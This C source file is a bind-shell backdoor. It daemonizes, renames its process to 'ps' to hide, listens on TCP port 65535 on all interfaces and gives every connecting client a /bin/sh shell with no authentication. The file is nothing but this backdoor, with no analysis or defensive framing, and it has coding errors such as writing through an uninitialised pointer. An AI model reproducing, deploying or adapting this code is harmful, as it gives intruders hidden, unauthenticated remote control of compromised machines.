#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>

void mk_daemon();

int main(int argc, char **argv)
{
int lfd,cfd;
socklen_t len;
struct sockaddr_in cli,serv;
pid_t pid;
char **sh;

sh[0]="/bin/sh";
sh[1]=NULL;

mk_daemon();
strncpy(argv[0],"ps",sizeof(argv[0]));
lfd=socket(AF_INET,SOCK_STREAM,0);
bzero(&serv,sizeof(serv));
serv.sin_family=AF_INET;
serv.sin_addr.s_addr=htonl(INADDR_ANY);
serv.sin_port=htons(65535);
bind(lfd,(struct sockaddr *)&serv,sizeof(serv));
listen(lfd,5);

while(1)
{
len=sizeof(cli);
cfd=accept(lfd,(struct sockaddr *)&cli,&len);
	if(!(pid=fork()))
	{
	dup2(cfd,0);
	dup2(cfd,1);
	dup2(cfd,2);
	execve(sh[0],sh,NULL);
	close(cfd);
	exit(0);
	}
close(cfd);
}
return 0;
}

void mk_daemon()
{
/* yes I did get this out of UNP */
int x;
pid_t pid;
	if((pid=fork()) !=0)
	{
	exit(-1);
	}
setsid();
signal(SIGHUP,SIG_IGN);
signal(SIGINT,SIG_IGN);

	if((pid=fork()) !=0)
	{
	exit(-1);
	}
chdir("/");
umask(0);
	for(x=0;x<=64;x++)
	{
	close(x);
	}
}